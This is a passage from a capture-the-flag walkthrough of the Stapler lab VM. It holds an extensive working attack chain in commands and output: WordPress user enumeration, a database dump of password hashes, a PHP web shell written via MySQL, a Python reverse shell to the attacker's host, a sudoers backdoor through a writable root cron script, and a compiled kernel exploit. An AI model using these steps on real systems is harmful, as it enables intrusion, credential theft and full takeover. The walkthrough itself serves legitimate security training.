wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate u
[+] Enumerating usernames ...
[+] Identified the following 10 user/s:
    +----+---------+-----------------+
    | Id | Login   | Name            |
    +----+---------+-----------------+
    | 1  | john    | John Smith      |
    | 2  | elly    | Elly Jones      |
    | 3  | peter   | Peter Parker    |
    | 4  | barry   | Barry Atkins    |
    | 5  | heather | Heather Neville |
    | 6  | garry   | garry           |
    | 7  | harry   | harry           |
    | 8  | scott   | scott           |
    | 9  | kathy   | kathy           |
    | 10 | tim     | tim             |
    +----+---------+-----------------+
```

Next I enumerated all the plugins in the hope of finding an exploitable vulnerability:

``` 
wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate ap
[+] Enumerating all plugins (may take a while and use a lot of system resources) ...

   Time: 00:04:40 <=====================> (74652 / 74652) 100.00% Time: 00:04:40

[+] We found 4 plugins:

[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2015-10-14T13:52:00.000Z
 |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/

[+] Name: akismet
 |  Latest version: 4.0.7 
 |  Last updated: 2018-05-28T16:19:00.000Z
 |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: shortcode-ui - v0.6.2
 |  Last updated: 2017-09-12T20:55:00.000Z
 |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/
 |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
[!] The version is out of date, the latest version is 0.7.3
[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/

[+] Name: two-factor
 |  Latest version: 0.1-dev-20180225 
 |  Last updated: 2018-02-25T10:55:00.000Z
 |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/
 |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/readme.txt
[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/
```

Still not much. The expected way is to upload a reverse shell, but I didn't have credentials for the WP users and I tried bruteforcing but it was very slow. I remembered that I have the MySQL credentials from earlier:

``` 
root@kali:~# mysql -u root -h 192.168.217.141 wordpress -p
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 21183
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [wordpress]> 
```

I logged in to the DB and grabbed the password hashes:

``` 
MySQL [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

MySQL [wordpress]> SELECT user_login, user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
```

I tried cracking them with john but it took so long so I aborted it. Instead, I leveraged the fact that MySQL was running as root to write a rudimentary shell on the filesystem:

``` 
MySQL [wordpress]> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
Query OK, 1 row affected (0.04 sec)
```

I tested the shell:

``` 
https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami
www-data 
```

Then I used one of PentestMonkey's awesome one-liners to upgrade the shell, after setting up a listener:

``` 
https://192.168.217.141:12380/blogblog/wp-content/uploads/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.217.132",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

nc -vnlp 8888
listening on [any] 8888 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.141] 39846
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```

A bit convoluted and relying on the enumeration / access from previous attempts, but I got another low privileged shell. I proceeded to do more enumeration in order to find a different way of elevating privileges. One of the things I did was search for files owned by root and writeable by everyone:

``` 
find / -type f -user root -perm /o=w 2>/dev/null
```

I scrolled through the output until I found something interesting:

``` 
/usr/local/sbin/cron-logrotate.sh
www-data@red:/$ cat /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh
#Simon, you really need to-do something about this
```

A cronjob run by root that we can write to! I added the following line that adds www-data to sudoers:

``` 
echo "echo 'www-data  ALL=NOPASSWD: ALL' >> /etc/sudoers" >> /usr/local/sbin/cron-logrotate.sh
```

Waited a bit and then:

``` 
$ sudo su


id
uid=0(root) gid=0(root) groups=0(root)
```

Lastly, we can get root just by using an exploit. I ran my [linux_privcheck.py](https://github.com/chousensha/linux_privcheck) against the kernel version:

``` 
python linux_privcheck.py 
Kernel version is 4.4.0-21-generic
###########################################
POTENTIALLY VULNERABLE TO
Name: BPF Privilege Escalation
CVE: CVE-2016-4557
Source code: https://www.exploit-db.com/exploits/39772/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: Netfilter target_offset Out-of-Bounds Privilege Escalation
CVE: N/A
Source code: https://www.exploit-db.com/exploits/40049/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: AF_PACKET Race Condition Privilege Escalation
CVE: CVE-2016-8655
Source code: https://www.exploit-db.com/exploits/40871/
###########################################
###########################################
POTENTIALLY VULNERABLE TO
Name: DCCP Double-Free Privilege Escalation
CVE: CVE-2017-6074
Source code: https://www.exploit-db.com/exploits/41458/
###########################################
```

I used the first exploit, downloaded the files to my machine, and then uploaded them to the Stapler box by using the TFTP that I've identified previously:

``` 
tftp 192.168.217.141
tftp> put compile.sh
Sent 160 bytes in 0.1 seconds
tftp> put doubleput.c
Sent 4330 bytes in 0.0 seconds
tftp> put hello.c
Sent 2272 bytes in 0.1 seconds
tftp> put suidhelper.c
Sent 267 bytes in 0.0 seconds
```

On my shell, I looked around and saw that the files were uploaded to the <code>/home/www</code> directory. I copied them to /tmp, compiled and ran the exploit:

``` 
$ ./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""

$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Getting root, a 3rd time! Thanks g0tmi1k for an awesome boot2root!

``` 
 _________________________________________
/ Q: How does a hacker fix a function     \
| which                                   |
|                                         |
| doesn't work for all of the elements in |
\ its domain? A: He changes the domain.   /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```









